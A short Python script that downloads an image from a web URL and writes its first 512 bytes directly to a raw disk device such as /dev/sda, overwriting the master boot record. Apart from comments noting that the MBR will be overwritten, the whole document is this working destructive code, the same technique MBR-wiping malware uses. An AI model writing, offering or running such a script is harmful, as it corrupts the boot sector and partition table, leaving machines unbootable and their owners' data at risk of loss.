import requests

# Step 1: Download the image from the HTTPS link
url = "https://th.bing.com/th/id/OIP.RH2gc-Oe1qSvCjD3IRYAyQHaE7?rs=1&pid=ImgDetMain"  # Replace with your actual image URL
response = requests.get(url)

# Ensure the request was successful
if response.status_code == 200:
    image_data = response.content
else:
    raise Exception(f"Failed to download image. Status code: {response.status_code}")

# Step 2: Convert the image data to bytes
# Note: This step might be redundant as `response.content` is already in bytes format

# Step 3: Write the bytes to the MBR
mbr_path = "/dev/sdX"  # Replace with the appropriate device (e.g., /dev/sda)

# WARNING: This will overwrite the MBR of the specified disk
with open(mbr_path, "wb") as mbr:
    mbr.write(image_data[:512])

print("MBR has been overwritten with the image data.")
